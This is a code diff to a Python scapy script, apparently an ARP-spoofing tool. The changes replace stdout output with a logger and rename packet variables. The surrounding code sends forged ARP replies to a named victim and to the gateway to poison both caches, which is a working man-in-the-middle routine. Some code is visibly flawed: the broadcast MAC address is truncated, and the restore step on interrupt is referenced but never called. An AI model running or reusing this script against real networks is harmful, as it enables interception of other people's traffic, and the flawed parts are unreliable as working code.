@@ -24,8 +24,7 @@ class ARP:
         packet = scapy.Ether(dst='ff:ff:ff:ff')/scapy.ARP(op='who-has', pdst=ip)
         resp, _ = scapy.srp(packet, timeout=1, verbose=False)
         for _, r in resp:
-            sys.stdout.write(f"our mac: {r[scapy.Ether].src}")
-            sys.stdout.flush()
+            logger.log(f"our mac: {r[scapy.Ether].src}", 'ARPer')
             return r[scapy.Ether].src
         return None
 
@@ -52,18 +51,18 @@ class ARP:
                 packetsSent = packetsSent + 2
 
                 # to victim
-                packet = scapy.ARP(op=2,
+                victimPacket = scapy.ARP(op=2,
                                    pdst=self.targetIP,
                                    hwdst=self.getMacAddress(self.targetIP),
                                    psrc=self.spoofWithIP)
-                scapy.send(packet, verbose=False)
+                scapy.send(victimPacket, verbose=False)
 
                 # to gateway
-                packet = scapy.ARP(op=2,
+                gatewayPacket = scapy.ARP(op=2,
                                    pdst=self.spoofWithIP,
                                    hwdst=self.getMacAddress(self.spoofWithIP),
                                    psrc=self.targetIP)
-                scapy.send(packet, verbose=False)
+                scapy.send(gatewayPacket, verbose=False)
 
             except KeyboardInterrupt:
                 self.restoreOriginalARPs
